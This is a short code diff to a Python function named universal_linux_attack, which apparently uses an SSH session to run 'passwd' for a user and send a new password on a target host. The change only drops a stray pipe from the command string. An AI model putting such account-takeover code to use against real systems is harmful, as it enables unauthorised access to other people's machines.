@@ -81,7 +81,7 @@ def universal_linux_attack(host):
     ssh.prompt()
     print(ssh.before.decode('utf8'))
 
-    user_passwd_cmd = "| passwd {0}".format(username)
+    user_passwd_cmd = "passwd {0}".format(username)
     ssh.sendline(user_passwd_cmd)
     ssh.expect("password: ")
     ssh.sendline(password)
